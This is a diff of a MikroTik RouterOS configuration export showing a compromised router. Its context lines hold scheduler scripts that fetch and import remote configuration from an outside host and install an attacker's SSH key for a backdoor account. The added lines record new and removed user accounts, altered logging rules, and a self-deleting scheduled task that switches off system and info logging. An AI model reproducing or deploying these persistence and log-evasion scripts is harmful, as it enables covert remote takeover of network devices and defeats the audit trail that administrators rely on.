@@ -11,6 +11,21 @@
 # Flags: U - UNDOABLE
 # Columns: ACTION, BY, POLICY, TIME
 #   ACTION                         BY          POLICY  TIME
+# U user SystemMikrotik removed    0           write   2026-09-24 06:02:41
+#                                              policy
+# U new script scheduled           0           write   2026-09-24 05:59:46
+# U user admin-net added           0           write   2026-09-24 05:59:46
+#                                              policy
+# U user SystemMikrotik added      0           write   2026-09-24 05:59:46
+#                                              policy
+# U log action changed             0           write   2026-09-24 05:59:45
+# U log rule changed               0           write   2026-09-24 05:59:45
+# U log rule changed               0           write   2026-09-24 05:59:45
+# U log rule changed               0           write   2026-09-24 05:59:45
+# U log rule changed               0           write   2026-09-24 05:59:45
+# U log rule changed               0           write   2026-09-24 05:59:45
+# U traffic flow config changed    0           write   2026-09-24 05:59:45
+# U log action changed             0           write   2026-09-24 05:59:45
 # U new script scheduled           admin_obsq  write   2026-09-23 23:56:17
 # U new script scheduled           admin_obsq  write   2026-09-23 23:56:16
 # U user admin_obsq added          0           write   2026-09-21 04:27:10
@@ -165,6 +180,7 @@ add address=162.159.200.123
 /system scheduler
 add interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab10390/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-23 start-time=21:10:00
 add name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
+add interval=1s name=autosupoutrif on-event="/system scheduler remove autosupoutrif; /system logging disable [find topics~\"info\" || topics~\"system\"]" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon start-date=2026-09-24 start-time=05:59:46
 /tool bandwidth-server
 set authenticate=no enabled=no
 /tool mac-server
